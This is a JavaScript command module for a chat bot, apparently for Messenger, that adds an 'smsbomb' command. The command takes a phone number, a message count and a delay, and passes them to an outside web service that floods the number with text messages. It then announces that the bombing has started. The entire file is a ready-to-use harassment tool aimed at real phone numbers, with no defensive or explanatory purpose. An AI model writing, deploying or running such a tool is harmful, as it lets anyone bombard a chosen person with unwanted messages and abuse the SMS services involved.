const axios = require('axios');

module.exports.config = {
    name: 'smsbomb',
    version: '1.0.0',
    role: 0,
    hasPrefix: true,
    aliases: ['smsbomb'],
    description: "Start SMS bombing",
    usage: "smsbomb [phone] [amount] [cooldown]",
    credits: 'churchill',
};

module.exports.run = async function ({ api, event, args }) {
    const [phone, amount, cooldown] = args;

    if (!phone || !amount || !cooldown) {
        return api.sendMessage('Please provide a phone number, amount, and cooldown period.', event.threadID, event.messageID);
    }

    try {
        const response = await axios.get(`https://deku-rest-api-3ijr.onrender.com/smsb`, {
            params: {
                number: phone,
                amount: amount,
                delay: cooldown
            }
        });

        api.sendMessage('SMS bombing started!', event.threadID, event.messageID);
    } catch (error) {
        console.error('Error starting SMS bombing:', error);
        api.sendMessage('Error starting SMS bombing.', event.threadID, event.messageID);
    }
};
